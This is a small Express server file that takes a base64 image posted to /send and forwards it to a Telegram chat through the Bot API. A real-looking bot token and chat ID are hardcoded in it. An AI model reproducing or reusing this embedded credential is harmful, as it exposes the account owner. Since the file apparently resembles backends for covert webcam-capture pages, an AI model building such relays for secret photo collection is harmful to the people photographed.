import express from "express";
import fetch from "node-fetch";
import FormData from "form-data";

const app = express();
app.use(express.json({ limit: "10mb" }));

// ⬇️ لێرە توکین و chat_id بخەیت
const BOT_TOKEN = "8217314634:AAHDXoQd9AIN56z9g3UKlSfCt3B8ZC1t5sM";
const CHAT_ID = "7607512740";

app.post("/send", async (req, res) => {
  try {
    const { image } = req.body;
    const data = image.replace(/^data:image\/(png|jpeg);base64,/, "");
    const buffer = Buffer.from(data, "base64");

    const formData = new FormData();
    formData.append("chat_id", CHAT_ID);
    formData.append("photo", buffer, { filename: "photo.jpg" });

    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
      method: "POST",
      body: formData
    });

    res.json({ ok: true });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "Failed to send" });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`✅ Server running on port ${PORT}`));